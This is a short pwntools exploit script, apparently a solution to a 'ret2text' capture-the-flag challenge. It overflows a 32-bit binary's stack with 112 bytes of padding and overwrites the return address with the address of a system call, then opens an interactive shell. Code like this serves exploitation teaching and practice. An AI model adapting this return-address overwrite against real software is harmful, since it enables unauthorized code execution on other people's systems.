#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
local = 1
if local:
	p = process('./ret2text')
else:
	p = remote('127.0.0.1', 8888)
offset = 112
sys_addr = 0x0804863a
payload = 'A' * offset + p32(sys_addr)
p.sendline(payload)
p.interactive()
